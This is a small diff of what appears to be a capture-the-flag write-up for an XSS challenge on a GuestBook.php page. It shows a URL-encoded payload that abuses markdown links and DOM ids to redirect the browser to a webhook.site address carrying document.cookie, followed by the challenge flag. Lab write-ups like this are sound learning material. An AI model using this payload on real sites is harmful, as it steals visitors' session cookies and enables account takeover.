@@ -85,5 +85,6 @@ payload to trigger XSS:
 pyalod: `GuestBook.php/?content=%5Bquandz%5D%28%23%27+id%3D%27CONFIG%27+%29%0D%0A%5Bquandz1%5D%28%23%27+id%3D%27CONFIG%27++name%3D%27debug%27+%29%0D%0A%5Bquandz2%5D%28javascript%3Alocation%3D%60https%3A%2F%2Fwebhook.site%2Fff5cb011-604b-4a33-8f15-28450e5dcb9d%3Fcookies%3D%60+%2B+document.cookie%27++id%3D%27CONFIG%27+name%3D%27main%27+%29`
 
 flag: `DH{f35a6e5d4109190bdfa3fa59134cff19}`
+done
 
 
